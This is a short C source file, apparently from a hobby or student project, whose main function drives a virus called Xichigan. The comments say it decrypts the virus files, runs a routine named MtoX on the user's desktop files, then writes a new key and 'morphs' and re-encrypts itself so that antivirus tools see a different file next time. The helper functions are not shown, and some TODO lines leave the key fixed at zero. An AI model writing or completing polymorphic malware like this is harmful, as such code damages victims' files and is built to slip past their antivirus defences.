#include "Xichigan.h"

/*********************************************************************************
* Author: Laine Rumreich								       				 				   *
*																				 							*
*																				 							*
* How to compile: make										 					 					*
* How to run: ./xichigan                 									 	 				*
**********************************************************************************/

int main(int argc, char*argv[]) {
	int key; // Encryption key
	FILE *fp;
 	printf("Xichigan!\n");
	/* 
		Decrypt the file MtoX.c using the key in key.txt
	*/
	// Get the key from key.txt
	fp = fopen("key.txt","r");
	fscanf (fp, "%d", &key); 
	fclose(fp);

	// Decrypt the files needed to run the virus
	decryptFile(key); // TODO probably remove this

	/* 
		Run MtoX on files on the user's desktop 
	*/
	MtoX();

	/* 
		Encrypt File 
	*/
	// Generate a new key and put it in the file key.txt
	srand(time(NULL));
	key = rand() % 100 + 1; 
	key = 0; // TODO delete this when ready
	
	fp = fopen("key.txt","w");
	fprintf (fp, "%d", key); 
	fclose(fp);

	// Encrypt/Morph the file MtoX using the key so it looks different to the antivirus next time
	morphFile();
	encryptFile(key);	// TODO probably remove this

	return 0;
}


